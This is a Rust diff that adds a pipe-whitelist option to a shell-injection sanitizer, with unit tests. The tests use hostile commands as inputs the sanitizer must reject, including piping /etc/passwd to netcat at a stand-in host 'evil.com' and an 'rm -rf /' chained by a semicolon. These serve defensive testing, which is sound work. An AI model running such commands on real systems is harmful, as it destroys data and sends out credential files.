@@ -179,13 +179,49 @@ impl InputSanitizer {
 
     /// Check if input contains shell injection patterns
     pub fn has_injection_risk(input: &str) -> bool {
-        let dangerous_patterns = [
-            "$(", "`", "&&", "||", ";", "|", ">", "<", ">>", "<<", "\\n", "\n", "\r", "../", "..\\",
+        Self::has_injection_risk_with_pipe_whitelist(input, &[])
+    }
+
+    /// Check if input contains shell injection patterns, allowing whitelisted pipe commands.
+    ///
+    /// When `allowed_pipe_commands` is non-empty, a single pipe (`|`) is permitted
+    /// provided the right-hand-side command is in the whitelist.
+    /// Multiple pipes and all other dangerous patterns are always rejected.
+    pub fn has_injection_risk_with_pipe_whitelist(
+        input: &str,
+        allowed_pipe_commands: &[String],
+    ) -> bool {
+        // Patterns that are always dangerous (pipe handled separately)
+        let always_dangerous = [
+            "$(", "`", "&&", "||", ";", ">", "<", ">>", "<<", "\\n", "\n", "\r", "../", "..\\",
         ];
 
-        for pattern in &dangerous_patterns {
+        for pattern in &always_dangerous {
             if input.contains(pattern) {
                 return true;
+            }
+        }
+
+        // Check pipe usage
+        if input.contains('|') {
+            if allowed_pipe_commands.is_empty() {
+                return true; // no whitelist → all pipes blocked
+            }
+
+            let parts: Vec<&str> = input.split('|').collect();
+            // Only allow a single pipe (two segments)
+            if parts.len() != 2 {
+                return true;
+            }
+
+            let rhs = parts[1].trim();
+            // Extract the base command (first word) from the right-hand side
+            let rhs_cmd = rhs.split_whitespace().next().unwrap_or("");
+            if !allowed_pipe_commands
+                .iter()
+                .any(|allowed| allowed == rhs_cmd)
+            {
+                return true; // pipe target not in whitelist
             }
         }
 
@@ -816,6 +852,67 @@ mod tests {
         let integrity = ConfigIntegrity::new();
         assert!(integrity.hash().is_none());
         assert!(integrity.verify().is_err());
+    }
+
+    // ── Pipe Whitelist Tests ──
+
+    #[test]
+    fn test_pipe_whitelist_empty_blocks_all() {
+        assert!(InputSanitizer::has_injection_risk_with_pipe_whitelist(
+            "ps aux | grep nginx",
+            &[]
+        ));
+    }
+
+    #[test]
+    fn test_pipe_whitelist_allows_whitelisted_command() {
+        let whitelist = vec!["grep".to_string(), "head".to_string(), "sort".to_string()];
+        assert!(!InputSanitizer::has_injection_risk_with_pipe_whitelist(
+            "ps aux | grep nginx",
+            &whitelist
+        ));
+        assert!(!InputSanitizer::has_injection_risk_with_pipe_whitelist(
+            "cat file.txt | head -n 10",
+            &whitelist
+        ));
+        assert!(!InputSanitizer::has_injection_risk_with_pipe_whitelist(
+            "ls -la | sort",
+            &whitelist
+        ));
+    }
+
+    #[test]
+    fn test_pipe_whitelist_blocks_non_whitelisted() {
+        let whitelist = vec!["grep".to_string()];
+        assert!(InputSanitizer::has_injection_risk_with_pipe_whitelist(
+            "cat /etc/passwd | nc evil.com 1234",
+            &whitelist
+        ));
+    }
+
+    #[test]
+    fn test_pipe_whitelist_blocks_multiple_pipes() {
+        let whitelist = vec!["grep".to_string(), "wc".to_string()];
+        // Multiple pipes are always rejected
+        assert!(InputSanitizer::has_injection_risk_with_pipe_whitelist(
+            "ps aux | grep nginx | wc -l",
+            &whitelist
+        ));
+    }
+
+    #[test]
+    fn test_pipe_whitelist_still_blocks_other_injection() {
+        let whitelist = vec!["grep".to_string()];
+        // Semicolon injection still blocked
+        assert!(InputSanitizer::has_injection_risk_with_pipe_whitelist(
+            "echo hello; rm -rf /",
+            &whitelist
+        ));
+        // Command substitution still blocked
+        assert!(InputSanitizer::has_injection_risk_with_pipe_whitelist(
+            "echo $(whoami)",
+            &whitelist
+        ));
     }
 
     // ── Error Masking Tests ──
